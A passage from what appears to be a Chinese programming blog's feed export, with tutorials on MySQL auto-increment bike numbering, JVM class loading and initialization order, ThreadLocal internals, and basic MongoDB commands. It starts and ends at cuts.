    <content type="text"><![CDATA[完成单车编号连续递增 1、需求因为要给车进行编号，为了防止重复和提高插入的效率，用连续的号来作为小车的编号是比较合适的，问题就在于编号的产生。 2、解决用mysql的自增特性完成对小车的编号。具体方式如下： 首先是创建一个id连续自增的作为小车编号的临时表：auto_inc_no 建表语句： 123456DROP TABLE IF EXISTS `auto_inc_no`;CREATE TABLE `auto_inc_no` ( `auto_inc_no` bigint(20) NOT NULL AUTO_INCREMENT, `what_ever` tinyint(2) NOT NULL, PRIMARY KEY (`auto_inc_no`)) ENGINE=InnoDB AUTO_INCREMENT=28000066 DEFAULT CHARSET=utf8; 建表成功之后，设计表，使它的自动递增那一栏的初始值设为28000000（navicat） 建立Bike表： 12345678DROP TABLE IF EXISTS `bike`;CREATE TABLE `bike` ( `id` bigint(20) NOT NULL AUTO_INCREMENT, `number` bigint(20) NOT NULL COMMENT '单车编号 标识唯一一辆单车', `type` tinyint(2) NOT NULL COMMENT '1 码码单车 2 码码Little', `enable_flag` tinyint(2) NOT NULL DEFAULT '1' COMMENT '1 可用 2 不可用', PRIMARY KEY (`id`)) ENGINE=InnoDB AUTO_INCREMENT=69 DEFAULT CHARSET=utf8; 下面就进行插值： 首先是创建一个给auto_inc_no插值的mapper： 123&lt;insert id="generateBikeNo" parameterType="com.oursnail.bike.entity.BikeNoGen" useGeneratedKeys="true" keyProperty="autoIncNo"&gt; insert into auto_inc_no (what_ever) values (1)&lt;/insert&gt; service中的实现为： 简而言之就是利用数据库自增特性生成的id给Bike的number进行赋值，完成连续编号。 1234567891011@Overridepublic void generateBike() throws BikeException &#123; //单车编号生成sql BikeNoGen bikeNoGen = new BikeNoGen(); bikeMapper.generateBikeNo(bikeNoGen); //生成单车 Bike bike = new Bike(); bike.setType((byte)1); bike.setNumber(bikeNoGen.getAutoIncNo()); bikeMapper.insertSelective(bike);&#125; controller： 12345678910111213141516@RequestMapping("/generateBike")public ApiResult generateBike() throws BikeException&#123; ApiResult&lt;String&gt; resp = new ApiResult&lt;&gt;(); try &#123; bikeService.generateBike(); resp.setMessage("创建单车成功"); &#125;catch (BikeException e)&#123; resp.setCode(e.getStatusCode()); resp.setMessage(e.getMessage()); &#125;catch (Exception e)&#123; log.error("Fail to update bike info", e); resp.setCode(Constants.RESP_STATUS_INTERNAL_ERROR); resp.setMessage("内部错误"); &#125; return resp;&#125; 这个方法是设置为不被拦截的，直接Postman请求这个方法即可。 1234&#123; &quot;code&quot;: 200, &quot;message&quot;: &quot;创建单车成功&quot;&#125; 这样就一个一个地产生了单车数据。]]></content>
      <tags>
        <tag>单车后台系统实战</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[十、虚拟机类加载机制]]></title>
    <url>%2F2018%2F07%2F21%2F%E5%8D%81%E3%80%81%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6%2F</url>
    <content type="text"><![CDATA[本章讲解虚拟机类加载机制。 类加载过程 加载 验证 准备 解析 初始化 接口的加载 例子巩固 问题 总结java执行顺序 总结java赋值顺序 1. 类加载过程类从被加载到虚拟机内存中开始，到卸载出内存为止，它的整个生命周期包括：加载（Loading）、验证（Verification）、准备(Preparation)、解析(Resolution)、初始化(Initialization)、使用(Using)和卸载(Unloading)7个阶段。其中准备、验证、解析3个部分统称为连接（Linking）。如图所示： 加载、验证、准备、初始化和卸载这5个阶段的顺序是确定的，类的加载过程必须按照这种顺序按部就班地开始，而解析阶段则不一定：它在某些情况下可以在初始化阶段之后再开始，这是为了支持Java语言的运行时绑定（也称为动态绑定或晚期绑定）。以下陈述的内容都以HotSpot为基准。 2. 加载在加载阶段（可以参考java.lang.ClassLoader的loadClass()方法），虚拟机需要完成以下3件事情： 通过一个类的全限定名来获取定义此类的二进制字节流（并没有指明要从一个Class文件中获取，可以从其他渠道，譬如：网络、动态生成、数据库等）； 将这个字节流所代表的静态存储结构转化为方法区的运行时数据结构； 在内存中生成一个代表这个类的java.lang.Class对象，作为方法区这个类的各种数据的访问入口； 加载阶段和连接阶段（Linking）的部分内容（如一部分字节码文件格式验证动作）是交叉进行的，加载阶段尚未完成，连接阶段可能已经开始，但这些夹在加载阶段之中进行的动作，仍然属于连接阶段的内容，这两个阶段的开始时间仍然保持着固定的先后顺序。 3. 验证验证是连接阶段的第一步，这一阶段的目的是为了确保Class文件的字节流中包含的信息符合当前虚拟机的要求，并且不会危害虚拟机自身的安全。 验证阶段大致会完成4个阶段的检验动作： 文件格式验证：验证字节流是否符合Class文件格式的规范；例如：是否以魔术0xCAFEBABE开头、主次版本号是否在当前虚拟机的处理范围之内、常量池中的常量是否有不被支持的类型。 元数据验证：对字节码描述的信息进行语义分析（注意：对比javac编译阶段的语义分析），以保证其描述的信息符合Java语言规范的要求；例如：这个类是否有父类，除了java.lang.Object之外。 字节码验证：通过数据流和控制流分析，确定程序语义是合法的、符合逻辑的。 符号引用验证：确保解析动作能正确执行。 验证阶段是非常重要的，但不是必须的，它对程序运行期没有影响，如果所引用的类经过反复验证，那么可以考虑采用-Xverifynone参数来关闭大部分的类验证措施，以缩短虚拟机类加载的时间。 4. 准备准备阶段是正式为类变量分配内存并设置类变量初始值的阶段，这些变量所使用的内存都将在方法区中进行分配。这时候进行内存分配的仅包括类变量（被static修饰的变量），而不包括实例变量，实例变量将会在对象实例化时随着对象一起分配在堆中。其次，这里所说的初始值“通常情况”下是数据类型的零值，假设一个类变量的定义为： 1public static int value=123; 那变量value在准备阶段过后的初始值为0而不是123.因为这时候尚未开始执行任何java方法，而把value赋值为123的putstatic指令是程序被编译后，存放于类构造器()方法之中，所以把value赋值为123的动作将在初始化阶段才会执行。 至于“特殊情况”是指：public static final int value=123，即当类字段的字段属性是ConstantValue时，会在准备阶段初始化为指定的值，所以标注为final之后，value的值在准备阶段初始化为123而非0. 5. 解析解析阶段是虚拟机将常量池内的符号引用替换为直接引用的过程。解析动作主要针对类或接口、字段、类方法、接口方法、方法类型、方法句柄和调用点限定符7类符号引用进行。 6. 初始化类初始化阶段是类加载过程的最后一步，到了初始化阶段，才真正开始执行类中定义的java程序代码。在准备阶段，变量已经赋过一次系统要求的初始值，而在初始化阶段，则根据程序猿通过程序制定的主观计划去初始化类变量和其他资源，或者说：初始化阶段是执行类构造器()方法的过程. ()方法是由编译器自动收集类中的所有类变量的赋值动作和静态语句块static{}中的语句合并产生的，编译器收集的顺序是由语句在源文件中出现的顺序所决定的，静态语句块只能访问到定义在静态语句块之前的变量，定义在它之后的变量，在前面的静态语句块可以赋值，但是不能访问。如下： 123456789public class Test&#123; static &#123; i=0; System.out.println(i);//这句编译器会报错：Cannot reference a field before it is defined（非法向前应用） &#125; static int i=1;&#125; 那么去掉报错的那句，改成下面： 1234567891011121314public class Test&#123; static &#123; i=0;// System.out.println(i); &#125; static int i=1; public static void main(String args[]) &#123; System.out.println(i); &#125;&#125; 输出结果是什么呢？当然是1啦~在准备阶段我们知道i=0，然后类初始化阶段按照顺序执行，首先执行static块中的i=0,接着执行static赋值操作i=1,最后在main方法中获取i的值为1。 ()方法与实例构造器()方法不同，它不需要显示地调用父类构造器，虚拟机会保证在子类()方法执行之前，父类的()方法已经执行完毕. 由于父类的()方法先执行，也就意味着父类中定义的静态语句块要优先于子类的变量赋值操作。 ()方法对于类或者接口来说并不是必需的，如果一个类中没有静态语句块，也没有对变量的赋值操作，那么编译器可以不为这个类生产()方法。 接口中不能使用静态语句块，但仍然有变量初始化的赋值操作，因此接口与类一样都会生成()方法。但接口与类不同的是，执行接口的()方法不需要先执行父接口的()方法。只有当父接口中定义的变量使用时，父接口才会初始化。另外，接口的实现类在初始化时也一样不会执行接口的()方法。 虚拟机会保证一个类的()方法在多线程环境中被正确的加锁、同步，如果多个线程同时去初始化一个类，那么只会有一个线程去执行这个类的()方法，其他线程都需要阻塞等待，直到活动线程执行()方法完毕。如果在一个类的()方法中有耗时很长的操作，就可能造成多个线程阻塞，在实际应用中这种阻塞往往是隐藏的。 虚拟机规范严格规定了有且只有5中情况（jdk1.7）必须对类进行“初始化”（而加载、验证、准备自然需要在此之前开始）： 遇到new,getstatic,putstatic,invokestatic这些字节码指令时，如果类没有进行过初始化，则需要先触发其初始化。生成这4条指令的最常见的Java代码场景是：使用new关键字实例化对象的时候、读取或设置一个类的静态字段（被final修饰、已在编译器把结果放入常量池的静态字段除外）的时候，以及调用一个类的静态方法的时候。 使用java.lang.reflect包的方法对类进行反射调用的时候，如果类没有进行过初始化，则需要先触发其初始化。 当初始化一个类的时候，如果发现其父类还没有进行过初始化，则需要先触发其父类的初始化。 当虚拟机启动时，用户需要指定一个要执行的主类（包含main()方法的那个类），虚拟机会先初始化这个主类。 当使用jdk1.7动态语言支持时，如果一个java.lang.invoke.MethodHandle实例最后的解析结果REF_getstatic,REF_putstatic,REF_invokeStatic的方法句柄，并且这个方法句柄所对应的类没有进行初始化，则需要先出触发其初始化。 下面说明三种被动引用(除了上面提到的五种情况外，所有引用类的方法都不会触发初始化，成为被动引用)。 第一种：通过子类引用父类的静态字段，不会导致子类初始化。 1234567public class SuperClass &#123; static &#123; System.out.println("superclass static init"); &#125; public static int value = 123;&#125; 12345public class SubClass extends SuperClass&#123; static&#123; System.out.println("SubClass static init"); &#125;&#125; 12345public class Test &#123; public static void main(String[] args) &#123; System.out.println(SubClass.value); &#125;&#125; 结果是： 12superclass static init123 说明：对于静态字段，只有直接定义这个字段的类才会被初始化，因此通过其子类来引用父类中定义的静态字段，只会触发父类的初始化而不会触发子类的初始化。 第二种：通过数组定义来引用类，不会触发此类的初始化 12345678910package chapter12;//SuperClass复用上面个代码public class NotInitialization&#123; public static void main(String[] args) &#123; SuperClass[] sca = new SuperClass[10]; &#125;&#125; 运行结果：（无） 说明：从结果来看，显然没有出发类chapter12.SuperClass的初始化阶段，但是这段代码触发了另一个名叫 “[Lchapter12.SuperClass”的类的初始化阶段。这显然不是一个合法的类名称，他是由虚拟机自动生成的、直接继承于java.lang.Object的子类，创建动作由字节码制定newarray触发。 这个类代表了一个元素类型为chapter12.SuperClass的一维数组，数组中应有的属性和方法(用于可直接使用的只有被修饰为public的length属性和clone()方法)都实现在这个类里。Java语言中对数组的访问比C/C++相对安全是因为这个类封装了数组元素的访问方法，而C/C++直接翻译为对数组指针的移动。 第三种：常量在编译阶段会存入调用类的常量池中，本质上并没有直接引用到定义常量的类，因此不会触发定义常量的类的初始化 12345678910111213141516public class ConstClass&#123; static &#123; System.out.println("ConstClass init!"); &#125; public static final String HELLOWORLD = "hello world";&#125;public class NotInitialization&#123; public static void main(String[] args) &#123; System.out.println(ConstClass.HELLOWORLD); &#125;&#125; 运行结果：hello world 说明：上述代码虽然在java源码中引用了ConstClass类中的常量hello world，但是其实在编译阶段通过常量传播优化，已经将此常量值hello world存储到了NotInitialization的常量池中，以后NotInitialization对常量ConstClass.HELLOWORLD的引用实际上都被转化为NotInitialization对自身常量池的引用了。 7. 接口的加载接口的加载过程与类加载过程有一些不同，针对接口需要做一些特殊说明： 接口也有初始化过程，而接口中不能使用static{}语句块，但编译器仍然会为接口生成”&lt;clinit()&gt;”类构造器，用于初始化接口中所定义的成员变量。 接口与类真正所区别的是前面讲述的5种“有且仅有”情况的第三种：当一个类在初始化时，要求其父类全部都已经初始化过了，但是一个借口在初始化时，并不要求其父接口全部都已经完成了初始化，只有在真正用到父接口时（如引用接口中定义的常量）才会初始化。 8. 例子巩固1234567public class SSClass&#123; static &#123; System.out.println("SSClass"); &#125;&#125; 1234567891011121314public class SuperClass extends SSClass&#123; static &#123; System.out.println("SuperClass init!"); &#125; public static int value = 123; public SuperClass() &#123; System.out.println("init SuperClass"); &#125;&#125; 1234567891011121314public class SubClass extends SuperClass&#123; static &#123; System.out.println("SubClass init"); &#125; static int a; public SubClass() &#123; System.out.println("init SubClass"); &#125;&#125; 1234567public class NotInitialization&#123; public static void main(String[] args) &#123; System.out.println(SubClass.value); &#125;&#125; 运行结果： 123SSClassSuperClass init!123 说明：对于静态字段，只有直接定义这个字段的类才会被初始化，因此通过其子类来引用父类中定义的静态字段，只会触发父类的初始化而不会触发子类的初始化。 9. 问题123456789101112131415161718192021222324252627282930313233package jvm.classload;public class StaticTest&#123; public static void main(String[] args) &#123; staticFunction(); &#125; static StaticTest st = new StaticTest(); static &#123; System.out.println("1"); &#125; &#123; System.out.println("2"); &#125; StaticTest() &#123; System.out.println("3"); System.out.println("a="+a+",b="+b); &#125; public static void staticFunction()&#123; System.out.println("4"); &#125; int a=110; static int b =112;&#125; 我们知道，一般java赋值的顺序是： 父类的静态变量赋值 自身的静态变量赋值 父类成员变量赋值和父类块赋值 父类构造函数赋值 自身成员变量赋值和自身块赋值 自身构造函数赋值 答案是： 1234523a=110,b=014 分析： 类的生命周期是：加载-&gt;验证-&gt;准备-&gt;解析-&gt;初始化-&gt;使用-&gt;卸载，只有在准备阶段和初始化阶段才会涉及类变量的初始化和赋值，因此只针对这两个阶段进行分析； 类的准备阶段需要做是为类变量分配内存并设置默认值，因此类变量st为null、b为0；（需要注意的是如果类变量是final，编译时javac将会为value生成ConstantValue属性，在准备阶段虚拟机就会根据ConstantValue的设置将变量设置为指定的值，如果这里这么定义：static final int b=112,那么在准备阶段b的值就是112，而不再是0了。） 的初始化阶段需要做是执行类构造器（类构造器是编译器收集所有静态语句块和类变量的赋值语句按语句在源码中的顺序合并生成类构造器，对象的构造方法是()，类的构造方法是()，可以在堆栈信息中看到），因此先执行第一条静态变量的赋值语句即st = new StaticTest ()，此时会进行对象的初始化，对象的初始化是先初始化成员变量再执行构造方法，因此设置a为110-&gt;打印2-&gt;执行构造方法(打印3,此时a已经赋值为110，但是b只是设置了默认值0，并未完成赋值动作)，等对象的初始化完成后继续执行之前的类构造器的语句，接下来就不详细说了，按照语句在源码中的顺序执行即可。 这里面还牵涉到一个冷知识，就是在嵌套初始化时有一个特别的逻辑。特别是内嵌的这个变量恰好是个静态成员，而且是本类的实例。 这会导致一个有趣的现象：“实例初始化竟然出现在静态初始化之前”。 其实并没有提前，你要知道java记录初始化与否的时机。 看一个简化的代码，把关键问题解释清楚： 1234567public class Test &#123; public static void main(String[] args) &#123; func(); &#125; static Test st = new Test(); static void func()&#123;&#125;&#125; 根据上面的代码，有以下步骤： 首先在执行此段代码时，首先由main方法的调用触发静态初始化。 在初始化Test 类的静态部分时，遇到st这个成员。 但凑巧这个变量引用的是本类的实例。 那么问题来了，此时静态初始化过程还没完成就要初始化实例部分了。是这样么？ 从人的角度是的。但从java的角度，一旦开始初始化静态部分，无论是否完成，后续都不会再重新触发静态初始化流程了。 因此在实例化st变量时，实际上是把实例初始化嵌入到了静态初始化流程中，并且在楼主的问题中，嵌入到了静态初始化的起始位置。这就导致了实例初始化完全至于静态初始化之前。这也是导致a有值b没值的原因。 最后再考虑到文本顺序，结果就显而易见了。 所以回顾这个开始的代码，显然是这样的： 首先在执行此段代码时，首先由main方法的调用触发静态初始化。 在初始化StaticTest 类的静态部分时，即执行这句： static StaticTest st = new StaticTest();，遇到st这个成员。 但凑巧这个变量引用的是本类的实例。 因此在实例化st变量时，实际上是把实例初始化嵌入到了静态初始化流程中，并且在楼主的问题中，嵌入到了静态初始化的起始位置。 对象实例的初始化是先初始化成员变量，那么a=110,b为静态变量，处于类初始化的准备阶段，所以是默认值0，还没有进行赋值。 对象实例化，这里先执行普通代码块，然后执行构造方法。 等对象的初始化完成后继续执行之前的类构造器的语句，即静态代码块，最后是main中调用的方法执行。此时b=112。 10.总结java执行顺序举例立刻明白： 123456789101112131415public class Children extends Parent&#123; public Children() &#123; System.out.println("Children构造函数"); &#125; &#123; System.out.println("Children普通代码块"); &#125; static &#123; System.out.println("Children静态代码块"); &#125; public static void main(String[] args) &#123; Children children = new Children(); &#125;&#125; 1234567891011public class Parent &#123; public Parent() &#123; System.out.println("Parent构造函数"); &#125; &#123; System.out.println("Parent普通代码块"); &#125; static &#123; System.out.println("Parent静态代码块"); &#125;&#125; 执行结果： 123456Parent静态代码块Children静态代码块Parent普通代码块Parent构造函数Children普通代码块Children构造函数 总结： 123456父类静态块自身静态块父类块父类构造器自身块自身构造器 11. 总结java赋值顺序举例立刻明白： 12345678910111213141516public class Parent &#123; public String flag = "父类成员变量赋值"; public Parent() &#123; System.out.println(); System.out.println("父类构造器---&gt;" + flag); flag = "父类构造器赋值"; System.out.println("父类构造器---&gt;" + flag); &#125; &#123; System.out.println("父类代码块---&gt;" + flag); flag = "父类代码块赋值"; System.out.println("父类代码块---&gt;" + flag); &#125;&#125; 123456789101112131415161718192021222324252627public class Children extends Parent&#123; public String flag = "成员变量赋值"; public Children() &#123; System.out.println(); System.out.println("子类构造器---&gt;" + flag); flag = "子类构造器赋值"; System.out.println("子类构造器---&gt;" + flag); &#125; &#123; System.out.println(); System.out.println("子类代码快---&gt;" + flag); flag = "子类代码块赋值"; System.out.println("子类代码块---&gt;" + flag); &#125; public void setFlag()&#123; System.out.println(); System.out.println("子类方法---&gt;" + flag); &#125; public static void main(String[] args) &#123; Children children = new Children(); children.setFlag(); &#125;&#125; 运行结果：12345678910111213父类代码块---&gt;父类成员变量赋值父类代码块---&gt;父类代码块赋值父类构造器---&gt;父类代码块赋值父类构造器---&gt;父类构造器赋值子类代码快---&gt;成员变量赋值子类代码块---&gt;子类代码块赋值子类构造器---&gt;子类代码块赋值子类构造器---&gt;子类构造器赋值子类方法---&gt;子类构造器赋值 总结： 12345678910父类的静态变量赋值自身的静态变量赋值父类成员变量赋值父类块赋值父类构造器赋值自身成员变量赋值自身块赋值自身构造器赋值]]></content>
      <tags>
        <tag>java虚拟机</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[十、ThreadLocal详解]]></title>
    <url>%2F2018%2F07%2F21%2F%E5%8D%81%E3%80%81ThreadLocal%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[ThreadLocal是面试重灾区，分为两篇来讲解其中的用法和原理。这是第一篇。 ThreadLocal简介ThreadLocal类用来提供线程内部的局部变量。这些变量在多线程环境下访问(通过get或set方法访问)时能保证各个线程里的变量相对独立于其他线程内的变量，ThreadLocal实例通常来说都是private static类型。 ThreadLocal类提供了四个对外开放的接口方法，这也是用户操作ThreadLocal类的基本方法： void set(Object value)设置当前线程的线程局部变量的值。 public Object get()该方法返回当前线程所对应的线程局部变量。 public void remove()将当前线程局部变量的值删除，目的是为了减少内存的占用，该方法是JDK 5.0新增的方法。需要指出的是，当线程结束后，对应该线程的局部变量将自动被垃圾回收，所以显式调用该方法清除线程的局部变量并不是必须的操作，但它可以加快内存回收的速度。 protected Object initialValue()返回该线程局部变量的初始值，该方法是一个protected的方法，显然是为了让子类覆盖而设计的。这个方法是一个延迟调用方法，在线程第1次调用get()或set(Object)时才执行，并且仅执行1次，ThreadLocal中的缺省实现直接返回一个null。 一个简单的小例子来感受ThreadLocal到底是什么以及怎么用： 1234567891011121314151617181920212223242526272829303132333435363738394041import java.util.ArrayList;import java.util.List;public class ThreadLocalDemo &#123; public static ThreadLocal&lt;List&lt;String&gt;&gt; threadLocal = new ThreadLocal&lt;&gt;(); public void setThreadLocal(List&lt;String&gt; values) &#123; threadLocal.set(values); &#125; public void getThreadLocal() &#123; System.out.println(Thread.currentThread().getName()); threadLocal.get().forEach(name -&gt; System.out.println(name)); &#125; public static void main(String[] args) throws InterruptedException &#123; final ThreadLocalDemo threadLocal = new ThreadLocalDemo(); new Thread(() -&gt; &#123; List&lt;String&gt; params = new ArrayList&lt;&gt;(3); params.add("张三"); params.add("李四"); params.add("王五"); threadLocal.setThreadLocal(params); threadLocal.getThreadLocal(); &#125;).start(); new Thread(() -&gt; &#123; try &#123; Thread.sleep(1000); List&lt;String&gt; params = new ArrayList&lt;&gt;(2); params.add("Chinese"); params.add("English"); threadLocal.setThreadLocal(params); threadLocal.getThreadLocal(); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; &#125;).start(); &#125;&#125; 运行结果： 1234567Thread-0张三李四王五Thread-1ChineseEnglish 分析 可以，看出虽然多个线程对同一个变量进行访问，但是由于threadLocal变量由ThreadLocal 修饰，则不同的线程访问的就是该线程设置的值，这里也就体现出来ThreadLocal的作用。 当使用ThreadLocal维护变量时，ThreadLocal为每个使用该变量的线程提供独立的变量副本，所以每一个线程都可以独立地改变自己的副本，而不会影响其它线程所对应的副本。 扒开JDK threadlocal神秘面纱threadlocal的原理图为： 那ThreadLocal内部是如何为每一个线程维护变量副本的呢？到底是什么原理呢？ 先来看一下ThreadLocal的set()方法的源码是如何实现的： 123456789public void set(T value) &#123; Thread t = Thread.currentThread(); ThreadLocalMap map = getMap(t); if (map != null) //this在这里代表的是当前线程的ThreadLocal对象 map.set(this, value); else createMap(t, value);&#125; 我们看到，首先通过getMap(Thread t)方法获取一个和当前线程相关的ThreadLocalMap，然后将变量的值设置到这个ThreadLocalMap对象中，当然如果获取到的ThreadLocalMap对象为空，就通过createMap方法创建。 我们再往下面去一点，比如map.set方法到底是怎么实现的？ 123456789101112131415161718192021222324252627private void set(ThreadLocal&lt;?&gt; key, Object value) &#123; Entry[] tab = table; int len = tab.length; //我们的值放在哪个entry中，是在这里确定数组索引位置的 int i = key.threadLocalHashCode &amp; (len-1); for (Entry e = tab[i]; e != null; e = tab[i = nextIndex(i, len)]) &#123; ThreadLocal&lt;?&gt; k = e.get(); if (k == key) &#123; e.value = value; return; &#125; if (k == null) &#123; replaceStaleEntry(key, value, i); return; &#125; &#125; tab[i] = new Entry(key, value); int sz = ++size; if (!cleanSomeSlots(i, sz) &amp;&amp; sz &gt;= threshold) rehash();&#125; 结合上面的图，其实我们可以发现，数据并不是放在所谓的Map集合中，而是放进了一个Entry数组中，这个entry索引是上面计算好的，entry的key是指向threadLocal的一个软引用，value是指向真实数据的一个强引用，以后再获取的时候，再以同样的方式计算得到索引下标即可。 上面代码出现的 ThreadLocalMap 是什么？ ThreadLocalMap是ThreadLocal类的一个静态内部类，它实现了键值对的设置和获取（对比Map对象来理解），每个线程中都有一个独立的ThreadLocalMap副本，它所存储的值，只能被当前线程读取和修改。 我们深入看一下getMap和createMap的实现 getMap:123ThreadLocalMap getMap(Thread t) &#123; return t.threadLocals;&#125; createMap:123void createMap(Thread t, T firstValue) &#123; t.threadLocals = new ThreadLocalMap(this, firstValue);&#125; 代码非常直白，就是获取和设置Thread内的一个叫threadLocals的变量，而这个变量的类型就是ThreadLocalMap，这样进一步验证了上文中的观点：每个线程都有自己独立的ThreadLocalMap对象。 Thread源码中的threadLocals： 1ThreadLocal.ThreadLocalMap threadLocals = null; 我们接着看ThreadLocal中的get方法如下 12345678910111213141516171819202122232425262728public T get() &#123; Thread t = Thread.currentThread(); ThreadLocalMap map = getMap(t); if (map != null) &#123; ThreadLocalMap.Entry e = map.getEntry(this); if (e != null) &#123; @SuppressWarnings("unchecked") T result = (T)e.value; return result; &#125; &#125; return setInitialValue();&#125;private T setInitialValue() &#123; T value = initialValue(); Thread t = Thread.currentThread(); ThreadLocalMap map = getMap(t); if (map != null) map.set(this, value); else createMap(t, value); return value;&#125;protected T initialValue() &#123; return null;&#125; 第一步 先获通过Thread.currentThread（）取当前线程 第二步 然后获取当前线程的threadLocals属性 第三步 在threadLocals属性里获取Entry实例 第四部 从Entry实例的value属性里获取到最后所要的Object对象 接下来讨论一下上面出现的ThreadLocalMap类以及Entry类，直接贴源码 123456789101112131415161718192021222324static class ThreadLocalMap &#123; static class Entry extends WeakReference&lt;ThreadLocal&lt;?&gt;&gt; &#123; /** The value associated with this ThreadLocal. */ Object value; Entry(ThreadLocal&lt;?&gt; k, Object v) &#123; super(k); value = v; &#125; &#125; ... ... /** * The table, resized as necessary. * table.length MUST always be a power of two. */ private Entry[] table; /** * The number of entries in the table. */ private int size = 0; ... ... &#125; Entry是ThreadLocalMap的内部类，而且ThreadLocalMap里拥有一个类型为Entry[]的table属性，而且每个线程实例有自己的ThreadLocalMap。到这里结论已经很明显了：负责保存ThreadLocal的key和value根本就不是一个Map类型，而是一个Entry数组! Entry继承WeakReference，因此继承拥有一个弱引用referent，而且自身也有一个value属性。Entry利用referent来保存threadLocal实例的弱引用，利用value保存Object的强引用。至于为什么一个是强引用，一个是弱引用，我们在下一篇中来探讨。 最后的问题是怎样在Entry数组里定位我们需要的Entry呢?其实上面在set的时候已经大概知道了，现在再来看看代码吧： 12345678private Entry getEntry(ThreadLocal&lt;?&gt; key) &#123; int i = key.threadLocalHashCode &amp; (table.length - 1); Entry e = table[i]; if (e != null &amp;&amp; e.get() == key) return e; else return getEntryAfterMiss(key, i, e);&#125; 留意key.threadLocalHashCode这个属性，Entry在保存进Entry[]数组之前，会利用ThreadLocal的引用计算出一个hash值，然后利用这个hash值作为下标定位到Entry[]数组的某个位置； 原理总结：ThreadLocal类并没有一个Map来保存数据，数据都是保存在线程实例上的；客户端访问ThreadLocal实例的get方法，get方法通过Thread.getCurrentThread获得当前线程的实例，从而获得当前线程的ThreadLocalMap对象，而ThreadLocalMap里包含了一个Entry数组，里面的每个Entry保存了ThreadLocal引用以及Object引用，Entry的referent保存ThreadLocal的弱引用，Entry的value保存Object的强引用。 threadLocal实例 threadlocal实现的可复用的耗时统计工具Profiler 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647public class Profiler &#123; private static final ThreadLocal&lt;Long&gt; durationThreadLocal = new ThreadLocal&lt;Long&gt;() &#123; @Override protected Long initialValue() &#123; return System.currentTimeMillis(); &#125; &#125;; public static void begin() &#123; durationThreadLocal.set(System.currentTimeMillis()); &#125; public static long end() &#123; return System.currentTimeMillis() - durationThreadLocal.get(); &#125; public static void main(String[] args) &#123; new Thread(new Runnable() &#123; @Override public void run() &#123; Profiler.begin(); try &#123; Thread.sleep(999); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; System.out.println(Thread.currentThread().getName()+"耗时： "+Profiler.end()); &#125; &#125;).start(); new Thread(new Runnable() &#123; @Override public void run() &#123; Profiler.begin(); try &#123; Thread.sleep(1999); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; System.out.println(Thread.currentThread().getName()+"耗时： "+Profiler.end()); &#125; &#125;).start(); &#125;&#125; 运行结果： 12Thread-0耗时： 1000Thread-1耗时： 1999 threadLocal实现数据库连接线程隔离 12345678910111213141516171819202122232425public class ConnectionManager &#123; private static ThreadLocal&lt;Connection&gt; connectionHolder = new ThreadLocal&lt;Connection&gt;() &#123; @Override protected Connection initialValue() &#123; Connection conn = null; try &#123; conn = DriverManager.getConnection( "jdbc:mysql://localhost:3306/test", "username", "password"); &#125; catch (SQLException e) &#123; e.printStackTrace(); &#125; return conn; &#125; &#125;; public static Connection getConnection() &#123; return connectionHolder.get(); &#125; public static void setConnection(Connection conn) &#123; connectionHolder.set(conn); &#125;&#125; 通过调用ConnectionManager.getConnection()方法，每个线程获取到的，都是和当前线程绑定的那个Connection对象，第一次获取时，是通过initialValue()方法的返回值来设置值的。通过ConnectionManager.setConnection(Connection conn)方法设置的Connection对象，也只会和当前线程绑定。这样就实现了Connection对象在多个线程中的完全隔离。 在Spring容器中管理多线程环境下的Connection对象时，采用的思路和以上代码非常相似。 threadLocal缺陷ThreadLocal变量的这种隔离策略，也不是任何情况下都能使用的。 如果多个线程并发访问的对象实例只能创建那么一个，那就没有别的办法了，老老实实的使用同步机制吧。 下一篇探讨ThreadLocal 内存泄漏问题。 参考： http://rayleung.xyz/2017/03/01/thread/# http://vence.github.io/2016/05/28/threadlocal-info/ https://blog.csdn.net/lovesomnus/article/details/64441426]]></content>
      <tags>
        <tag>java并发基础</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[十、MongoDB入门下]]></title>
    <url>%2F2018%2F07%2F21%2F%E5%8D%81%E3%80%81MongoDB%E5%85%A5%E9%97%A8%E4%B8%8B%2F</url>
    <content type="text"><![CDATA[MongoDB入门学习。 1、为什么要用mongodb？假设一片微博，有很多评论和标签，那么典型的做法就是再搞一张评论表和一张标签表，显示是比较麻烦的。 对于mongodb，数据模型可能是： 123456789101112131415161718_id: POST_ID title: TITLE_OF_POST, description: POST_DESCRIPTION, author: POST_BY, tags: [TAG1, TAG2, TAG3], likes: TOTAL_LIKES, comments: [ &#123; user:&apos;COMMENT_BY&apos;, message: TEXT, dateCreated: DATE_TIME, &#125;, &#123; user:&apos;COMMENT_BY&apos;, message: TEXT, dateCreated: DATE_TIME, &#125; ] 那么本来的三张表在这里只需要一个文档就能解决。 2、创建集合和删除集合1use tutorial //新建了一个叫做tutorial的数据库 1db.createCollection(&apos;author&apos;)//数据库里添加一个集合(collection) 12show databases//展示所有的数据库show collections//展示这个数据库下面的所有集合 1db.author.drop()//删除集合 3、插入模拟一个电影的信息： 12345678电影名字导演主演(可能多个)类型标签(可能多个)上映日期喜欢人数不喜欢人数用户评论(可能多个) 显然我们需要先创建一个叫电影的集合： 1db.createCollection(&apos;movie&apos;) 插入数据： 12345678910111213141516171819202122232425db.movie.insert( &#123; title: &apos;Forrest Gump&apos;, directed_by: &apos;Robert Zemeckis&apos;, stars: [&apos;Tom Hanks&apos;, &apos;Robin Wright&apos;, &apos;Gary Sinise&apos;], tags: [&apos;drama&apos;, &apos;romance&apos;], debut: new Date(1994,7,6,0,0), likes: 864367, dislikes: 30127, comments: [ &#123; user:&apos;user1&apos;, message: &apos;My first comment&apos;, dateCreated: new Date(2013,11,10,2,35), like: 0 &#125;, &#123; user:&apos;user2&apos;, message: &apos;My first comment too!&apos;, dateCreated: new Date(2013,11,11,6,20), like: 0 &#125; ]&#125;) 我们也可以同时输入多个数据： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960db.movie.insert([ &#123; title: &apos;Fight Club&apos;, directed_by: &apos;David Fincher&apos;, stars: [&apos;Brad 